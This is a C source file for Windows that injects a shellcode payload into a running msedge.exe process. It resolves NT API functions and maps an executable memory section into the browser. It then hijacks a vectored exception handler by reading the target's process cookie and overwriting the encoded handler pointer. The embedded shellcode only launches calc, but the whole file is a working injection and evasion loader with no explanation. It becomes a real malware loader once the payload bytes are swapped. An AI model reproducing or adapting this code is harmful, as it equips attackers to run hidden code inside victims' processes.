#include "header.h"
#pragma warning (disable : 4047)
#pragma warning (disable : 4024)

extern PVOID GetBase();

unsigned char calc[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

typedef struct _G_NTAPI {
	fnNtClose						  pNtClose;
	fnNtOpenProcess					  pNtOpenProcess;
	fnNtCreateSection				  pNtCreateSection;
	fnNtMapViewOfSection			  pNtMapViewOfSection;
	fnNtReadVirtualMemory			  pNtReadVirtualMemory;
	fnNtWriteVirtualMemory			  pNtWriteVirtualMemory;
	fnNtProtectVirtualMemory		  pNtProtectVirtualMemory;
	fnNtQuerySystemInformation		  pNtQuerySystemInformation;
	fnNtQueryInformationProcess		  pNtQueryInformationProcess;
} G_NTAPI, * PG_NTAPI;

G_NTAPI g_Nt = { 0 };

BOOL InitNtApis(PVOID ntdll, PG_NTAPI g_Nt) {

	g_Nt->pNtClose = (fnNtClose)GetProcAddress(ntdll, "NtClose");
	g_Nt->pNtOpenProcess = (fnNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
	g_Nt->pNtCreateSection = (fnNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
	g_Nt->pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
	g_Nt->pNtReadVirtualMemory = (fnNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
	g_Nt->pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	g_Nt->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	g_Nt->pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	g_Nt->pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

	if (!g_Nt->pNtCreateSection || !g_Nt->pNtMapViewOfSection || !g_Nt->pNtQuerySystemInformation || !g_Nt->pNtQueryInformationProcess || !g_Nt->pNtProtectVirtualMemory || !g_Nt->pNtClose || !g_Nt->pNtOpenProcess || !g_Nt->pNtReadVirtualMemory || !g_Nt->pNtWriteVirtualMemory) {
		printf("[!] Some NTAPI addresses weren't retrieved\n");
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL MsHandle(HANDLE* hTarget, DWORD* dwTarget) {

	NTSTATUS			STATUS;
	OBJECT_ATTRIBUTES	oa = { 0 };
	CLIENT_ID			cid = { 0 };
	DWORD				dwPid = 0;
	ULONG				ulReturn1 = 0;
	PVOID				pFree = NULL;
	HANDLE				hTargetTmp = NULL;
	LPCWSTR				szProc = L"msedge.exe";
	PSYSTEM_PROCESS_INFORMATION	pProcInfo = NULL;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	g_Nt.pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ulReturn1);
	ulReturn1 += 1 << 12;

	pProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ulReturn1);

	if (pProcInfo == NULL) {
		printf("[!] ProcInfo HeapAlloc failed: %ld\n", GetLastError());
		return FALSE; goto _End;
	}

	if ((STATUS = g_Nt.pNtQuerySystemInformation(SystemProcessInformation, pProcInfo, ulReturn1, &ulReturn1)) != STATUS_SUCCESS) {
		printf("[!] NtQuerySystemInformation failed: 0x%0.8x\n", STATUS);
		return FALSE; goto _End;
	}

	pFree = pProcInfo;

	while (TRUE) {

		if (pProcInfo->ImageName.Length && wcscmp(pProcInfo->ImageName.Buffer, szProc) == 0) {
			cid.UniqueProcess = (DWORD)pProcInfo->UniqueProcessId;
			break;
		}

		if (!pProcInfo->NextEntryOffset) {
			break;
		}
		pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
	}

	if ((STATUS = g_Nt.pNtOpenProcess(&hTargetTmp, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &oa, cid)) != STATUS_SUCCESS) {
		printf("[!] NtOpenProcess Failed: 0x%0.8X\n", STATUS);
		return FALSE; goto _End;
	}

	*hTarget = hTargetTmp;
	*dwTarget = cid.UniqueProcess;

_End:

	if (pFree)
		HeapFree(GetProcessHeap(), 0, pFree); pFree = NULL;

	if ((*hTarget == NULL) || (*dwTarget == 0)) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL RemoteMap(HANDLE hTarget, PVOID* pRemoteBuffer) {

	NTSTATUS STATUS;
	PVOID pLocal = NULL;
	PVOID pRemote = NULL;
	HANDLE hSection = NULL;
	SIZE_T szPayload = sizeof(calc);
	SIZE_T szViewSize = NULL;

	LARGE_INTEGER li = { .HighPart = 0, .LowPart = szPayload };

	if ((STATUS = g_Nt.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
		printf("[!] NtCreateSection failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if ((STATUS = g_Nt.pNtMapViewOfSection(hSection, (HANDLE)-1, &pLocal, NULL, NULL, NULL, &szViewSize, 2, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
		printf("[!] NtMapViewOfSection failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	memcpy(pLocal, calc, szPayload);

	if ((STATUS = g_Nt.pNtMapViewOfSection(hSection, hTarget, &pRemote, NULL, NULL, NULL, &szViewSize, 1, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
		printf("[!] NtMapViewOfSection failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	*pRemoteBuffer = pRemote;

	if (!*pRemoteBuffer) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

ULONG_PTR EncodeStuff(DWORD cookie, PVOID pointer) {

	unsigned char shift_size = 0x40 - (cookie & 0x3f);
	ULONG_PTR Xor = (ULONG_PTR)pointer ^ cookie;
	return ROL(Xor, shift_size);
}

BOOL RemoteCookie(HANDLE hTarget, DWORD* dwCookie) {

	NTSTATUS STATUS;
	DWORD	 cookie = 0;
	ULONG	 ulRetLength = 0;

	if ((STATUS = g_Nt.pNtQueryInformationProcess(hTarget, 0x24, &cookie, sizeof(cookie), &ulRetLength)) != STATUS_SUCCESS) {
		printf("[!] Getting cookie failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	*dwCookie = cookie;

	if (*dwCookie == 0) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL OverWriteRemoteVeh(PVOID pVehList, PVOID pMappedMemory, HANDLE hTarget) {

	NTSTATUS	STATUS;
	PVOID		pPayload = NULL;
	DWORD		dwCookie = 0;
	DWORD		dwOld = 0;

	VECTORED_HANDLER_LIST	handler_list = { 0 };
	VEH_HANDLER_ENTRY	handler_entry = { 0 };
	SIZE_T			szPointer = sizeof(handler_entry.VectoredHandler1);

	if ((STATUS = g_Nt.pNtReadVirtualMemory(hTarget, pVehList, &handler_list, sizeof(handler_list), NULL)) != STATUS_SUCCESS) {
		printf("[!] NtReadVirtualMemory failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if ((ULONG_PTR)handler_list.FirstExceptionHandler == (ULONG_PTR)pVehList + sizeof(ULONG_PTR)) {
		printf("[!] VEH list is empty\n");
		return FALSE;
	}

	if ((STATUS = g_Nt.pNtReadVirtualMemory(hTarget, handler_list.FirstExceptionHandler, &handler_entry, sizeof(handler_entry), NULL)) != STATUS_SUCCESS) {
		printf("[!] NtReadVirtualMemory failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if (!RemoteCookie(hTarget, &dwCookie)) {
		printf("[!] getting remote cookie failed\n");
		return FALSE;
	}

	handler_entry.VectoredHandler1 = EncodeStuff(dwCookie, pMappedMemory);
	ULONG_PTR pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler1);

	//Try to use NtProtectVirtualMemory instead
	if (!VirtualProtectEx(hTarget, pointer_offset, szPointer, PAGE_READWRITE, &dwOld)) {
		printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
		return FALSE;
	}

	if ((STATUS = g_Nt.pNtWriteVirtualMemory(hTarget, pointer_offset, &handler_entry.VectoredHandler1, szPointer, NULL)) != STATUS_SUCCESS) {
		printf("[!] NtWriteVirtualMemory failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if (!VirtualProtectEx(hTarget, pointer_offset, szPointer, dwOld, &dwOld)) {
		printf("[!] VirtualProtectEx failed2: %ld\n", GetLastError());
		return FALSE;
	}

	printf("[+] Done overwriting VEH pointer\n");
	return TRUE;
}

PVOID VehList() {

	int	offset = 0;
	int	i = 1;
	PBYTE	pNext = NULL;
	PBYTE	pRtlpAddVectoredHandler = NULL;
	PBYTE	pVehList = NULL;


	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAddVectoredExceptionHandler");
	printf("[*] RtlAddVectoredExceptionHandler: 0x%p\n", pRtlAddVectoredExceptionHandler);

	while (*pRtlAddVectoredExceptionHandler != 0xcc) {

		if (*pRtlAddVectoredExceptionHandler == 0xe9) {

			pNext = pRtlAddVectoredExceptionHandler + 5;
			offset = *(int*)(pRtlAddVectoredExceptionHandler + 1);
			pRtlpAddVectoredHandler = (ULONG_PTR)pNext + offset;
			break;
		}

		pRtlAddVectoredExceptionHandler++;
	}

	if (!pRtlpAddVectoredHandler)
		return NULL;

	printf("[*] RtlpAddVectoredHandler: 0x%p\n", pRtlpAddVectoredHandler);

	while (TRUE) {

		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {

			if (i == 2) {
				offset = *(int*)(pRtlpAddVectoredHandler + 3);
				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
				pVehList = pNext + offset;
				return (PVOID)pVehList;
			}
			else {
				i++;
			}
		}

		pRtlpAddVectoredHandler++;
	}

	return NULL;
}

VOID main() {

	DWORD	dwEdge = 0;
	BOOL	bWin10 = 0;
	HANDLE	hTarget = NULL;
	HANDLE	hSection = NULL;
	PVOID	pRemoteMappedBuffer = NULL;
	PVOID	pLocalMappedBuffer = NULL;

	PVOID	ntdll = GetBase();
	PVOID	pVehList = VehList();

	if (!pVehList)
		return;

	printf("[*] Vehlist: 0x%p\n", pVehList);

	//Some extra API-s in this
	if (!InitNtApis(ntdll, &g_Nt))
		return;

	if (!MsHandle(&hTarget, &dwEdge))
		return;

	printf("[*] Found msedge.exe: %d\n", dwEdge);

	if (!RemoteMap(hTarget, &pRemoteMappedBuffer))
		return;

	if (!OverWriteRemoteVeh(pVehList, pRemoteMappedBuffer, hTarget))
		return;

	printf("[+] Finished");
	return;
}